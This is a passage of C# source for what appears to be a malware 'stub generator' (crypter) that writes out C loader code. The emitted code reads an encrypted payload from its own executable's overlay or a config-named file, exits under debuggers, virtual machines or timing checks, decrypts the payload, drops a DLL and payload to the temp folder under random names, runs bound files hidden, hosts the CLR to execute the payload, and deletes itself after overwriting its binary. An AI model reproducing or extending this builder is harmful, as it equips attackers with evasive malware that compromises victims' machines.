            sb.AppendLine("        memset(__VAR_name_buf__, 0, MAX_PATH);");
            sb.AppendLine("        uint32_t __VAR_cpylen__ = __VAR_bf__->__VAR_name_len__;");
            sb.AppendLine("        if (__VAR_cpylen__ > MAX_PATH - 1) __VAR_cpylen__ = MAX_PATH - 1;");
            sb.AppendLine("        memcpy(__VAR_name_buf__, __VAR_bf__->__VAR_name__, __VAR_cpylen__);");
            sb.AppendLine();
            sb.AppendLine("        char __VAR_file_path__[MAX_PATH];");
            sb.AppendLine("        memset(__VAR_file_path__, 0, MAX_PATH);");
            sb.AppendLine("        memcpy(__VAR_file_path__, __VAR_temp_dir__, strlen(__VAR_temp_dir__));");
            sb.AppendLine("        __FN_strcat_safe__(__VAR_file_path__, __VAR_name_buf__, MAX_PATH);");
            sb.AppendLine();
            sb.AppendLine("        __FN_write_file_to_disk__(__VAR_file_path__, __VAR_bf__->__VAR_data__, __VAR_bf__->__VAR_data_len__);");
            sb.AppendLine();
            sb.AppendLine("        if (__VAR_bf__->__VAR_action__ == 0) {");
            sb.AppendLine("            /* Action 0 = Open: ShellExecuteA */");
            sb.AppendLine("            __VAR_pShellExecuteA__(NULL, __STR_open__, __VAR_file_path__, NULL, NULL, SW_SHOW);");
            sb.AppendLine("        } else if (__VAR_bf__->__VAR_action__ == 1) {");
            sb.AppendLine("            /* Action 1 = Execute: CreateProcessA with CREATE_NO_WINDOW */");
            sb.AppendLine("            STARTUPINFOA __VAR_si__;");
            sb.AppendLine("            memset(&__VAR_si__, 0, sizeof(__VAR_si__));");
            sb.AppendLine("            __VAR_si__.cb = sizeof(__VAR_si__);");
            sb.AppendLine("            PROCESS_INFORMATION __VAR_pi__;");
            sb.AppendLine("            memset(&__VAR_pi__, 0, sizeof(__VAR_pi__));");
            sb.AppendLine("            __VAR_pCreateProcessA__(__VAR_file_path__, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &__VAR_si__, &__VAR_pi__);");
            sb.AppendLine("            if (__VAR_pi__.hProcess) __VAR_pCloseHandle__(__VAR_pi__.hProcess);");
            sb.AppendLine("            if (__VAR_pi__.hThread) __VAR_pCloseHandle__(__VAR_pi__.hThread);");
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitMelt(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Self-deletion (melt) ---- */");
            sb.AppendLine("static void __FN_melt_self__(void) {");
            sb.AppendLine("    char __VAR_self_path__[MAX_PATH];");
            sb.AppendLine("    memset(__VAR_self_path__, 0, MAX_PATH);");
            sb.AppendLine("    __VAR_pGetModuleFileNameA__(NULL, __VAR_self_path__, MAX_PATH);");
            sb.AppendLine();
            sb.AppendLine("    char __VAR_temp_dir__[MAX_PATH];");
            sb.AppendLine("    memset(__VAR_temp_dir__, 0, MAX_PATH);");
            sb.AppendLine("    __VAR_pGetTempPathA__(MAX_PATH, __VAR_temp_dir__);");
            sb.AppendLine();
            sb.AppendLine("    char __VAR_temp_path__[MAX_PATH];");
            sb.AppendLine("    memset(__VAR_temp_path__, 0, MAX_PATH);");
            sb.AppendLine("    memcpy(__VAR_temp_path__, __VAR_temp_dir__, strlen(__VAR_temp_dir__));");
            sb.AppendLine();
            sb.AppendLine("    uint32_t __VAR_rng__ = __VAR_pGetTickCount__();");
            sb.AppendLine("    char __VAR_rname__[16];");
            sb.AppendLine("    for (int __VAR_i__=0;__VAR_i__<8;__VAR_i__++) {");
            sb.AppendLine("        __VAR_rng__ = __FN_simple_rng__(__VAR_rng__);");
            sb.AppendLine("        __VAR_rname__[__VAR_i__] = 'a' + (__VAR_rng__ % 26);");
            sb.AppendLine("    }");
            sb.AppendLine("    __VAR_rname__[8] = '.'; __VAR_rname__[9] = 'b'; __VAR_rname__[10] = 'a'; __VAR_rname__[11] = 't'; __VAR_rname__[12] = 0;");
            sb.AppendLine("    __FN_strcat_safe__(__VAR_temp_path__, __VAR_rname__, MAX_PATH);");
            sb.AppendLine();
            sb.AppendLine("    __VAR_pMoveFileExA__(__VAR_self_path__, __VAR_temp_path__, MOVEFILE_REPLACE_EXISTING);");
            sb.AppendLine();
            sb.AppendLine("    /* Overwrite with random data */");
            sb.AppendLine("    HANDLE __VAR_hf__ = __VAR_pCreateFileA__(__VAR_temp_path__, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);");
            sb.AppendLine("    if (__VAR_hf__ != INVALID_HANDLE_VALUE) {");
            sb.AppendLine("        uint8_t __VAR_junk__[512];");
            sb.AppendLine("        for (int __VAR_i__=0;__VAR_i__<512;__VAR_i__++) {");
            sb.AppendLine("            __VAR_rng__ = __FN_simple_rng__(__VAR_rng__);");
            sb.AppendLine("            __VAR_junk__[__VAR_i__] = (uint8_t)__VAR_rng__;");
            sb.AppendLine("        }");
            sb.AppendLine("        DWORD __VAR_wr__ = 0;");
            sb.AppendLine("        __VAR_pWriteFile__(__VAR_hf__, __VAR_junk__, 512, &__VAR_wr__, NULL);");
            sb.AppendLine("        __VAR_pCloseHandle__(__VAR_hf__);");
            sb.AppendLine("    }");
            sb.AppendLine();
            sb.AppendLine("    __VAR_pDeleteFileA__(__VAR_temp_path__);");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitEntryPoint(StringBuilder sb, StubGeneratorConfig config)
        {
            sb.AppendLine("/* ---- Entry point ---- */");
            sb.AppendLine("int __stdcall WinMain(HINSTANCE __VAR_hInst__, HINSTANCE __VAR_hPrev__, LPSTR __VAR_cmdLine__, int __VAR_nShow__) {");
            sb.AppendLine("    (void)__VAR_hInst__; (void)__VAR_hPrev__; (void)__VAR_cmdLine__; (void)__VAR_nShow__;");
            sb.AppendLine();
            sb.AppendLine("    __FN_resolve_apis__();");
            sb.AppendLine();
            sb.AppendLine("    /* Debug log to temp */");
            sb.AppendLine("    char __VAR_dbg_path__[MAX_PATH];");
            sb.AppendLine("    { char* t = __VAR_dbg_path__; DWORD tl = __VAR_pGetTempPathA__(MAX_PATH, t);");
            sb.AppendLine("      memcpy(t+tl, \"jeisalive_dbg.txt\", 18); }");
            sb.AppendLine("    HANDLE __VAR_dbg__ = __VAR_pCreateFileA__(__VAR_dbg_path__, 0x40000000, 0, NULL, 2, 0x80, NULL);");
            sb.AppendLine("    #define DBG(s) { if (__VAR_dbg__ != (HANDLE)-1) { DWORD _w; __VAR_pWriteFile__(__VAR_dbg__, s, strlen(s), &_w, NULL); __VAR_pWriteFile__(__VAR_dbg__, \"\\r\\n\", 2, &_w, NULL); } }");
            sb.AppendLine("    DBG(\"[1] APIs resolved\");");
            sb.AppendLine();
            sb.AppendLine("    char __VAR_self_path__[MAX_PATH];");
            sb.AppendLine("    __VAR_pGetModuleFileNameA__(NULL, __VAR_self_path__, MAX_PATH);");

            if (config.SelfOverlay)
            {
                // EXE mode: read encrypted payload from PE overlay (appended after exe)
                // Overlay format: [payload bytes][4-byte LE payload length][8-byte magic "JEISAPLD"]
                sb.AppendLine("    /* Read overlay from own exe (magic trailer at end) */");
                sb.AppendLine("    HANDLE __VAR_hSelf__ = __VAR_pCreateFileA__(__VAR_self_path__, 0x80000000, 1, NULL, 3, 0, NULL);");
                sb.AppendLine("    if (__VAR_hSelf__ == (HANDLE)-1) { DBG(\"[!] self open failed\"); __VAR_pExitProcess__(0); return 1; }");
                sb.AppendLine("    DWORD __VAR_fsize__ = __VAR_pGetFileSize__(__VAR_hSelf__, NULL);");
                sb.AppendLine("    if (__VAR_fsize__ < 12) { __VAR_pCloseHandle__(__VAR_hSelf__); __VAR_pExitProcess__(0); return 1; }");
                sb.AppendLine();
                sb.AppendLine("    /* Read last 12 bytes: [4-byte length][8-byte magic] */");
                sb.AppendLine("    typedef DWORD (__stdcall *__FN_SetFilePointer_t__)(HANDLE, LONG, LONG*, DWORD);");
                sb.AppendLine("    __FN_SetFilePointer_t__ __VAR_pSetFilePointer__ = (__FN_SetFilePointer_t__)__VAR_pGetProcAddress__(__VAR_pGetModuleHandleA__(__STR_kernel32__), \"SetFilePointer\");");
                sb.AppendLine("    __VAR_pSetFilePointer__(__VAR_hSelf__, -12, NULL, 2);");
                sb.AppendLine("    uint8_t __VAR_trailer__[12];");
                sb.AppendLine("    DWORD __VAR_tr__ = 0;");
                sb.AppendLine("    __VAR_pReadFile__(__VAR_hSelf__, __VAR_trailer__, 12, &__VAR_tr__, NULL);");
                sb.AppendLine();
                sb.AppendLine("    /* Verify magic */");
                sb.AppendLine("    if (memcmp(__VAR_trailer__ + 4, \"JEISAPLD\", 8) != 0) {");
                sb.AppendLine("        DBG(\"[!] overlay magic not found\");");
                sb.AppendLine("        __VAR_pCloseHandle__(__VAR_hSelf__); __VAR_pExitProcess__(0); return 1;");
                sb.AppendLine("    }");
                sb.AppendLine("    uint32_t __VAR_ovl_len__ = __FN_read_u32_le__(__VAR_trailer__);");
                sb.AppendLine("    DBG(\"[2] Overlay found\");");
                sb.AppendLine();
                sb.AppendLine("    /* Seek to overlay start and read */");
                sb.AppendLine("    LONG __VAR_ovl_offset__ = (LONG)(__VAR_fsize__ - 12 - __VAR_ovl_len__);");
                sb.AppendLine("    __VAR_pSetFilePointer__(__VAR_hSelf__, __VAR_ovl_offset__, NULL, 0);");
                sb.AppendLine("    __DATA_blob__ = (unsigned char*)__VAR_pVirtualAlloc__(NULL, __VAR_ovl_len__, 0x3000, 0x04);");
                sb.AppendLine("    if (!__DATA_blob__) { __VAR_pCloseHandle__(__VAR_hSelf__); __VAR_pExitProcess__(0); return 1; }");
                sb.AppendLine("    DWORD __VAR_ovlRead__ = 0;");
                sb.AppendLine("    __VAR_pReadFile__(__VAR_hSelf__, __DATA_blob__, __VAR_ovl_len__, &__VAR_ovlRead__, NULL);");
                sb.AppendLine("    __VAR_pCloseHandle__(__VAR_hSelf__);");
                sb.AppendLine("    __DATA_blob_len__ = (int)__VAR_ovlRead__;");
            }
            else
            {
                // BAT mode: read payload path from .cfg file
                sb.AppendLine("    char __VAR_cfg_path__[MAX_PATH + 4];");
                sb.AppendLine("    memset(__VAR_cfg_path__, 0, sizeof(__VAR_cfg_path__));");
                sb.AppendLine("    memcpy(__VAR_cfg_path__, __VAR_self_path__, strlen(__VAR_self_path__));");
                sb.AppendLine("    memcpy(__VAR_cfg_path__ + strlen(__VAR_self_path__), \".cfg\", 4);");
                sb.AppendLine("    HANDLE __VAR_hCfg__ = __VAR_pCreateFileA__(__VAR_cfg_path__, 0x80000000, 1, NULL, 3, 0, NULL);");
                sb.AppendLine("    if (__VAR_hCfg__ == (HANDLE)-1) { DBG(\"[!] cfg not found\"); __VAR_pExitProcess__(0); return 1; }");
                sb.AppendLine("    char __VAR_payload_file__[MAX_PATH];");
                sb.AppendLine("    memset(__VAR_payload_file__, 0, MAX_PATH);");
                sb.AppendLine("    DWORD __VAR_cfgRead__ = 0;");
                sb.AppendLine("    __VAR_pReadFile__(__VAR_hCfg__, __VAR_payload_file__, MAX_PATH - 1, &__VAR_cfgRead__, NULL);");
                sb.AppendLine("    __VAR_pCloseHandle__(__VAR_hCfg__);");
                sb.AppendLine("    __VAR_pDeleteFileA__(__VAR_cfg_path__);");
                sb.AppendLine("    int __VAR_pf_len__ = (int)__VAR_cfgRead__;");
                sb.AppendLine("    while (__VAR_pf_len__ > 0 && (__VAR_payload_file__[__VAR_pf_len__-1] == '\\r' || __VAR_payload_file__[__VAR_pf_len__-1] == '\\n' || __VAR_payload_file__[__VAR_pf_len__-1] == ' ')) __VAR_pf_len__--;");
                sb.AppendLine("    __VAR_payload_file__[__VAR_pf_len__] = 0;");
                sb.AppendLine("    DBG(__VAR_payload_file__);");
                sb.AppendLine("    if (!__FN_read_payload_file__(__VAR_payload_file__)) { DBG(\"[!] read_payload FAILED\"); __VAR_pExitProcess__(0); return 1; }");
                sb.AppendLine("    DBG(\"[2] Payload file read OK\");");
            }
            sb.AppendLine();

            if (config.AntiDebug)
            {
                sb.AppendLine("    if (__FN_check_debugger__()) { __VAR_pExitProcess__(0); return 1; }");
            }

            if (config.AntiVM)
            {
                sb.AppendLine("    if (__FN_check_vm__()) { __VAR_pExitProcess__(0); return 1; }");
            }

            sb.AppendLine("    if (__FN_check_timing__()) { __VAR_pExitProcess__(0); return 1; }");
            sb.AppendLine();

            // Always use static key (no env-bound)
            sb.AppendLine("    uint8_t __VAR_key__[32];");
            sb.AppendLine("    /* Static key embedded in L1 blob (first 32 bytes of salt act as key placeholder) */");
            sb.AppendLine("    memcpy(__VAR_key__, __DATA_salt__, 32);");

            sb.AppendLine();
            sb.AppendLine("    __FN_unpacked_result__ __VAR_result__;");
            sb.AppendLine("    memset(&__VAR_result__, 0, sizeof(__VAR_result__));");
            sb.AppendLine("    DBG(\"[3] Decrypting L1+L2...\");");
            sb.AppendLine("    if (!__FN_decrypt_and_unpack__(__VAR_key__, &__VAR_result__)) {");
            sb.AppendLine("        DBG(\"[!] decrypt_and_unpack FAILED\");");
            sb.AppendLine("        __VAR_pExitProcess__(0);");
            sb.AppendLine("        return 1;");
            sb.AppendLine("    }");
            sb.AppendLine("    DBG(\"[4] Decryption OK\");");
            sb.AppendLine();

            sb.AppendLine("    /* Write managed DLL to temp */");
            sb.AppendLine("    char __VAR_temp_dir__[MAX_PATH];");
            sb.AppendLine("    memset(__VAR_temp_dir__, 0, MAX_PATH);");
            sb.AppendLine("    __VAR_pGetTempPathA__(MAX_PATH, __VAR_temp_dir__);");
            sb.AppendLine();
            sb.AppendLine("    char __VAR_dll_name__[32];");
            sb.AppendLine("    uint32_t __VAR_rng__ = __VAR_pGetTickCount__();");
            sb.AppendLine("    for (int __VAR_i__=0;__VAR_i__<8;__VAR_i__++) {");
            sb.AppendLine("        __VAR_rng__ = __FN_simple_rng__(__VAR_rng__);");
            sb.AppendLine("        __VAR_dll_name__[__VAR_i__] = 'a' + (__VAR_rng__ % 26);");
            sb.AppendLine("    }");
            sb.AppendLine("    __VAR_dll_name__[8] = 0;");
            sb.AppendLine("    __FN_strcat_safe__(__VAR_dll_name__, __STR_dotdll__, 32);");
            sb.AppendLine();
            sb.AppendLine("    char __VAR_dll_path__[MAX_PATH];");
            sb.AppendLine("    memset(__VAR_dll_path__, 0, MAX_PATH);");
            sb.AppendLine("    memcpy(__VAR_dll_path__, __VAR_temp_dir__, strlen(__VAR_temp_dir__));");
            sb.AppendLine("    __FN_strcat_safe__(__VAR_dll_path__, __VAR_dll_name__, MAX_PATH);");
            sb.AppendLine();
            sb.AppendLine("    DBG(\"[5] Writing managed DLL...\");");
            sb.AppendLine("    DBG(__VAR_dll_path__);");
            sb.AppendLine("    if (!__FN_write_file_to_disk__(__VAR_dll_path__, __VAR_result__.__VAR_dll_data__, __VAR_result__.__VAR_dll_len__)) {");
            sb.AppendLine("        DBG(\"[!] write DLL FAILED\");");
            sb.AppendLine("        __VAR_pExitProcess__(0);");
            sb.AppendLine("        return 1;");
            sb.AppendLine("    }");
            sb.AppendLine("    DBG(\"[6] DLL written OK\");");
            sb.AppendLine();

            sb.AppendLine("    /* Write encrypted payload to temp */");
            sb.AppendLine("    char __VAR_payload_name__[32];");
            sb.AppendLine("    for (int __VAR_i__=0;__VAR_i__<8;__VAR_i__++) {");
            sb.AppendLine("        __VAR_rng__ = __FN_simple_rng__(__VAR_rng__);");
            sb.AppendLine("        __VAR_payload_name__[__VAR_i__] = 'a' + (__VAR_rng__ % 26);");
            sb.AppendLine("    }");
            sb.AppendLine("    __VAR_payload_name__[8] = 0;");
            sb.AppendLine();
            sb.AppendLine("    char __VAR_payload_path__[MAX_PATH];");
            sb.AppendLine("    memset(__VAR_payload_path__, 0, MAX_PATH);");
            sb.AppendLine("    memcpy(__VAR_payload_path__, __VAR_temp_dir__, strlen(__VAR_temp_dir__));");
            sb.AppendLine("    __FN_strcat_safe__(__VAR_payload_path__, __VAR_payload_name__, MAX_PATH);");
            sb.AppendLine();
            sb.AppendLine("    if (!__FN_write_file_to_disk__(__VAR_payload_path__, __VAR_result__.__VAR_payload_data__, __VAR_result__.__VAR_payload_len__)) {");
            sb.AppendLine("        __VAR_pDeleteFileA__(__VAR_dll_path__);");
            sb.AppendLine("        __VAR_pExitProcess__(0);");
            sb.AppendLine("        return 1;");
            sb.AppendLine("    }");
            sb.AppendLine();

            if (config.HasBoundFiles)
            {
                sb.AppendLine("    __FN_launch_bound_files__(__VAR_temp_dir__, &__VAR_result__);");
                sb.AppendLine();
            }

            sb.AppendLine("    DBG(\"[7] Hosting CLR...\");");
            sb.AppendLine("    __FN_host_clr__(__VAR_dll_path__, __VAR_payload_path__, __VAR_result__.__VAR_l3_key__);");
            sb.AppendLine("    DBG(\"[8] CLR returned\");");
            sb.AppendLine();

            sb.AppendLine("    DBG(\"[9] Cleanup\");");
            sb.AppendLine("    if (__VAR_dbg__ != (HANDLE)-1) __VAR_pCloseHandle__(__VAR_dbg__);");
            sb.AppendLine("    /* Cleanup temp files */");
            sb.AppendLine("    __VAR_pDeleteFileA__(__VAR_dll_path__);");
            sb.AppendLine("    __VAR_pDeleteFileA__(__VAR_payload_path__);");
            sb.AppendLine();
            sb.AppendLine("    /* Free decrypted buffers */");
            sb.AppendLine("    if (__VAR_alloc_buf__)  __VAR_pVirtualFree__(__VAR_alloc_buf__,  0, 0x8000);");
            sb.AppendLine("    if (__VAR_alloc_buf2__) __VAR_pVirtualFree__(__VAR_alloc_buf2__, 0, 0x8000);");
            sb.AppendLine();

            if (config.HasMelt)
            {
                sb.AppendLine("    __FN_melt_self__();");
                sb.AppendLine();
            }

            sb.AppendLine("    __VAR_pExitProcess__(0);");
            sb.AppendLine("    return 0;");
            sb.AppendLine("}");
        }
    }
}
